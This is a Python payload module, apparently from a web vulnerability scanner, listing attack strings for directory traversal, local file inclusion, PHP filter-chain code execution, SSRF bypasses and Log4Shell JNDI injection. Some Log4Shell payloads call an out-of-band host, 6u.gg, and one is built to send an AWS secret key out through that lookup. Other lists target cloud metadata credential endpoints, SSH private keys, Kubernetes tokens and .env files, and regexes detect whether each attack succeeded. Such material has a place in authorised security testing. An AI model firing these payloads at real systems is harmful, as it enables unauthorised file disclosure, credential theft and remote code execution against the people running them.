"""
Directory traversal, LFI, SSRF, and related payloads.
AWVS10 base + 2018-2025 updates: PHP filter chain RCE, cloud metadata (7 providers),
SSRF bypasses, Log4Shell/JNDI, sensitive file discovery, 6u.gg OOB integration.
"""
import re

OOB_DOMAIN = "6u.gg"
OOB_CALLBACK = f"//{OOB_DOMAIN}/callback"
OOB_SSRF_REDIR = f"https://{OOB_DOMAIN}/r"
OOB_DNS = f"d.{OOB_DOMAIN}"

# --- DIRECTORY TRAVERSAL (Unix) ---

UNIX_TRAVERSAL = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "..%2fetc%2fpasswd",
    "..%252fetc%252fpasswd",
    "%2e%2e/etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "..%00/etc/passwd",
    "..%0d/etc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8fetc/passwd",
    "..%u2216..%u2216etc/passwd",
    ".%00./etc/passwd",
    "..%5c..%5c..%5cetc/passwd",
]

# --- DIRECTORY TRAVERSAL (Windows) ---

WINDOWS_TRAVERSAL = [
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5cwindows%5cwin.ini",
    "..%255cwindows%255cwin.ini",
    "....\\\\....\\\\windows\\win.ini",
    "c:\\windows\\win.ini",
    "file:///c:/windows/win.ini",
    "..\\boot.ini",
    "..\\..\\boot.ini",
    "..%c0%5c..%c0%5cwindows%c0%5cwin.ini",
]

# --- PHP WRAPPERS (original + filter chain RCE - Synacktiv 2022-2023) ---

PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=../config",
    "php://filter/convert.base64-encode/resource=../../config",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "php://filter/read=string.rot13/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UTF-7/resource=index.php",
    "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
]

PHP_FILTER_CHAIN_RCE = [
    "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp",
    "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp",
]

# --- JAVA TRAVERSAL ---

JAVA_TRAVERSAL = [
    "WEB-INF/web.xml",
    "../WEB-INF/web.xml",
    "../../WEB-INF/web.xml",
    "../../../WEB-INF/web.xml",
    "WEB-INF/classes/application.properties",
    "WEB-INF/classes/application.yml",
    "META-INF/MANIFEST.MF",
]

# --- CLOUD METADATA ENDPOINTS (7 providers + K8s) ---

CLOUD_METADATA = {
    "aws_imdsv1": [
        ("http://169.254.169.254/latest/meta-data/", "ami-id"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ""),
        ("http://169.254.169.254/latest/dynamic/instance-identity/document", "instanceId"),
        ("http://169.254.169.254/latest/user-data", ""),
    ],
    "aws_imdsv2": [
        ("http://169.254.169.254/latest/api/token", ""),
    ],
    "gcp": [
        ("http://metadata.google.internal/computeMetadata/v1/", ""),
        ("http://metadata.google.internal/computeMetadata/v1/project/project-id", ""),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "access_token"),
    ],
    "azure": [
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "vmId"),
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "access_token"),
    ],
    "digitalocean": [
        ("http://169.254.169.254/metadata/v1/", "droplet_id"),
        ("http://169.254.169.254/metadata/v1/id", ""),
        ("http://169.254.169.254/metadata/v1/user-data", ""),
    ],
    "alibaba": [
        ("http://100.100.100.200/latest/meta-data/", ""),
        ("http://100.100.100.200/latest/meta-data/instance-id", ""),
        ("http://100.100.100.200/latest/meta-data/ram/security-credentials/", ""),
    ],
    "oracle": [
        ("http://169.254.169.254/opc/v2/instance/", ""),
        ("http://169.254.169.254/opc/v1/instance/metadata/", ""),
    ],
    "kubernetes": [
        ("https://kubernetes.default.svc/api/v1/namespaces", ""),
        ("https://kubernetes.default.svc/api/v1/pods", ""),
    ],
}

CLOUD_INDICATORS = {
    "aws": ["ami-id", "instance-id", "instance-type", "local-hostname", "iam", "security-credentials"],
    "gcp": ["attributes/", "service-accounts/", "project-id", "access_token"],
    "azure": ["vmId", "subscriptionId", "resourceGroupName", "access_token"],
    "digitalocean": ["droplet_id", "floating_ip", "region"],
    "alibaba": ["instance-id", "ram", "security-credentials"],
    "oracle": ["availabilityDomain", "compartmentId", "shape"],
    "kubernetes": ["apiVersion", "items", "namespaces"],
}

# --- SSRF BYPASS TECHNIQUES ---

SSRF_BYPASS_LOCALHOST = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0x7f000001",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://127.1",
    "http://0",
    "http://0.0.0.0",
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://[::ffff:127.0.0.1]",
    "http://127.0.0.1.nip.io",
    "http://localtest.me",
    "http://127.0.0.1:80@127.0.0.1",
    "http://127.1/",
    "http://0x7f.0x0.0x0.0x1",
    "http://0177.0.0.01",
]

SSRF_BYPASS_URL_PARSER = [
    "http://evil.com#@169.254.169.254/latest/meta-data/",
    "http://evil.com\\@169.254.169.254/latest/meta-data/",
    "http://169.254.169.254\\@evil.com",
    "http://169.254.169.254%2523@evil.com",
    "http://[::]",
    "http://[0000::1]",
    "gopher://127.0.0.1:25/_EHLO",
    "dict://127.0.0.1:6379/info",
]

SSRF_OOB_PAYLOADS = [
    f"https://{OOB_DOMAIN}/callback/ssrf",
    f"http://{OOB_DNS}",
    f"{OOB_SSRF_REDIR}/aws",
    f"{OOB_SSRF_REDIR}/gcp",
    f"{OOB_SSRF_REDIR}/azure",
    f"{OOB_SSRF_REDIR}/docker",
    f"{OOB_SSRF_REDIR}/k8s",
    f"{OOB_SSRF_REDIR}/consul",
    f"{OOB_SSRF_REDIR}/redis",
    f"{OOB_SSRF_REDIR}/jenkins",
    f"https://{OOB_DOMAIN}/r?rebind=1",
]

# --- LOG4SHELL / JNDI INJECTION (CVE-2021-44228 + WAF bypasses) ---

LOG4SHELL_PAYLOADS = [
    f"${{jndi:ldap://{OOB_DNS}/a}}",
    f"${{jndi:dns://{OOB_DNS}/a}}",
    f"${{jndi:rmi://{OOB_DNS}/a}}",
    f"${{${{lower:j}}ndi:${{lower:l}}dap://{OOB_DNS}/a}}",
    f"${{${{upper:j}}ndi:${{upper:l}}dap://{OOB_DNS}/a}}",
    f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{OOB_DNS}/a}}",
    f"${{j${{env:DOESNT_EXIST:-n}}di:ldap://{OOB_DNS}/a}}",
    f"${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{OOB_DNS}/a}}",
    f"${{${{env:NaN:-j}}ndi${{env:NaN:-:}}${{env:NaN:-l}}dap${{env:NaN:-:}}//{OOB_DNS}/a}}",
    f"${{jndi:ldap://{OOB_DNS}/${{hostName}}}}",
    f"${{jndi:ldap://{OOB_DNS}/${{sys:java.version}}}}",
    f"${{jndi:ldap://{OOB_DNS}/${{env:AWS_SECRET_ACCESS_KEY}}}}",
]

LOG4SHELL_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "Referer",
    "X-Api-Version",
    "X-Druid-Comment",
    "Authorization",
    "Accept-Language",
    "X-Request-Id",
    "X-Correlation-Id",
    "CF-Connecting-IP",
    "True-Client-IP",
    "X-Real-IP",
]

# --- SENSITIVE FILE PATHS (expanded 2018-2025) ---

SENSITIVE_FILES = [
    "/.env",
    "/.env.production",
    "/.env.staging",
    "/.env.local",
    "/.env.backup",
    "/.git/config",
    "/.git/HEAD",
    "/.git/logs/HEAD",
    "/.gitignore",
    "/.svn/entries",
    "/.svn/wc.db",
    "/.hg/hgrc",
    "/.DS_Store",
    "/config.php",
    "/config.inc.php",
    "/wp-config.php",
    "/wp-config.php.bak",
    "/configuration.php",
    "/settings.php",
    "/database.yml",
    "/config/database.yml",
    "/config/secrets.yml",
    "/config/master.key",
    "/config/credentials.yml.enc",
    "/server-info",
    "/server-status",
    "/phpinfo.php",
    "/info.php",
    "/web.config",
    "/crossdomain.xml",
    "/elmah.axd",
    "/trace.axd",
    "/backup.sql",
    "/dump.sql",
    "/db.sql",
    "/database.sql",
    "/.htaccess",
    "/.htpasswd",
    "/nginx.conf",
    "/docker-compose.yml",
    "/docker-compose.yaml",
    "/Dockerfile",
    "/package.json",
    "/composer.json",
    "/Gemfile",
    "/requirements.txt",
    "/Pipfile",
    "/yarn.lock",
    "/package-lock.json",
    "/composer.lock",
    "/.npmrc",
    "/.yarnrc",
]

SENSITIVE_FILES_K8S_DOCKER = [
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/run/secrets/kubernetes.io/serviceaccount/token",
    "/.kube/config",
    "/etc/kubernetes/admin.conf",
    "/etc/kubernetes/kubelet.conf",
    "/root/.docker/config.json",
    "/.docker/config.json",
]

SENSITIVE_FILES_CLOUD = [
    "/.aws/credentials",
    "/.aws/config",
    "/root/.aws/credentials",
    "/home/user/.aws/credentials",
    "/.azure/accessTokens.json",
    "/.azure/azureProfile.json",
    "/.config/gcloud/credentials.db",
    "/.config/gcloud/access_tokens.db",
    "/.config/gcloud/application_default_credentials.json",
    "/root/.config/gcloud/application_default_credentials.json",
]

SENSITIVE_FILES_PROC = [
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/cwd",
    "/proc/self/fd/0",
    "/proc/self/maps",
    "/proc/self/status",
    "/proc/1/environ",
    "/proc/version",
    "/proc/net/tcp",
    "/proc/net/arp",
    "/proc/mounts",
]

SENSITIVE_FILES_SSH = [
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_ed25519",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/known_hosts",
    "/home/user/.ssh/id_rsa",
    "/home/user/.ssh/authorized_keys",
    "/etc/ssh/sshd_config",
    "/etc/ssh/ssh_host_rsa_key",
]

SENSITIVE_FILES_ACTUATOR = [
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/actuator/beans",
    "/actuator/configprops",
    "/actuator/mappings",
    "/actuator/heapdump",
    "/actuator/threaddump",
    "/actuator/logfile",
    "/actuator/jolokia",
    "/actuator/gateway/routes",
    "/api/actuator/env",
    "/manage/env",
    "/env",
]

SENSITIVE_FILES_API = [
    "/swagger.json",
    "/swagger/v1/swagger.json",
    "/api-docs",
    "/v2/api-docs",
    "/v3/api-docs",
    "/openapi.json",
    "/graphql",
    "/graphiql",
    "/_graphql",
    "/altair",
    "/playground",
    "/.well-known/openid-configuration",
    "/.well-known/jwks.json",
]

ALL_SENSITIVE_FILES = (
    SENSITIVE_FILES
    + SENSITIVE_FILES_K8S_DOCKER
    + SENSITIVE_FILES_CLOUD
    + SENSITIVE_FILES_PROC
    + SENSITIVE_FILES_SSH
    + SENSITIVE_FILES_ACTUATOR
    + SENSITIVE_FILES_API
)

# --- DETECTION PATTERNS ---

UNIX_PASSWD_PATTERN = re.compile(r"root:[x*]:0:0:")
WINDOWS_INI_PATTERN = re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.IGNORECASE)
WEBXML_PATTERN = re.compile(r"<web-app|<servlet|<servlet-mapping", re.IGNORECASE)

PROC_ENVIRON_PATTERN = re.compile(r"(PATH|HOME|USER|SHELL)=")
SSH_KEY_PATTERN = re.compile(r"-----BEGIN (RSA |EC |OPENSSH |ED25519 )?PRIVATE KEY-----")
K8S_TOKEN_PATTERN = re.compile(r"^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$", re.MULTILINE)
AWS_CREDS_PATTERN = re.compile(r"(aws_access_key_id|aws_secret_access_key)\s*=\s*\S+", re.IGNORECASE)
DOCKER_CONFIG_PATTERN = re.compile(r'"auths"\s*:\s*\{')
ACTUATOR_PATTERN = re.compile(r'"_links"\s*:\s*\{|"beans"\s*:\s*\[|"activeProfiles"')
HEAPDUMP_PATTERN = re.compile(rb"JAVA PROFILE|java\.lang\.")

PHP_INCLUDE_ERRORS = [
    "Failed opening required",
    "failed to open stream",
    "Warning: include",
    "Warning: require",
    "Warning: file_get_contents",
    "No such file or directory",
    "Warning: fopen",
    "Warning: readfile",
    "Warning: simplexml_load_file",
]

JAVA_LOG4J_INDICATORS = [
    "log4j",
    "Log4j",
    "LOG4J",
    "${jndi:",
    "JndiLookup",
]


def detect_traversal_success(response_body: str) -> tuple[bool, str]:
    if UNIX_PASSWD_PATTERN.search(response_body):
        return True, "Unix /etc/passwd content detected"
    if WINDOWS_INI_PATTERN.search(response_body):
        return True, "Windows win.ini content detected"
    if WEBXML_PATTERN.search(response_body):
        return True, "Java WEB-INF/web.xml content detected"
    if PROC_ENVIRON_PATTERN.search(response_body):
        return True, "/proc/self/environ content detected"
    if SSH_KEY_PATTERN.search(response_body):
        return True, "SSH private key detected"
    if AWS_CREDS_PATTERN.search(response_body):
        return True, "AWS credentials detected"
    if DOCKER_CONFIG_PATTERN.search(response_body):
        return True, "Docker config.json detected"
    return False, ""


def detect_include_error(response_body: str) -> tuple[bool, str]:
    body_lower = response_body.lower()
    for err in PHP_INCLUDE_ERRORS:
        if err.lower() in body_lower:
            return True, err
    return False, ""


def detect_sensitive_file(response_body: str, path: str) -> tuple[bool, str]:
    if ".env" in path and "=" in response_body:
        lines_with_eq = [l for l in response_body.split("\n") if "=" in l and not l.strip().startswith("#")]
        if len(lines_with_eq) >= 2:
            return True, f".env file with {len(lines_with_eq)} config entries"
    if ".git/config" in path and "[core]" in response_body:
        return True, "Git config exposed"
    if ".git/HEAD" in path and ("ref: refs/" in response_body or re.match(r"[0-9a-f]{40}", response_body)):
        return True, "Git HEAD exposed"
    if "actuator" in path and ACTUATOR_PATTERN.search(response_body):
        return True, "Spring Actuator endpoint exposed"
    if "swagger" in path.lower() and ('"swagger"' in response_body or '"openapi"' in response_body):
        return True, "Swagger/OpenAPI spec exposed"
    if "graphql" in path.lower() and ('"data"' in response_body or '"__schema"' in response_body):
        return True, "GraphQL endpoint exposed"
    if K8S_TOKEN_PATTERN.search(response_body):
        return True, "Kubernetes service account token exposed"
    if SSH_KEY_PATTERN.search(response_body):
        return True, "SSH private key exposed"
    if AWS_CREDS_PATTERN.search(response_body):
        return True, "AWS credentials file exposed"
    return False, ""
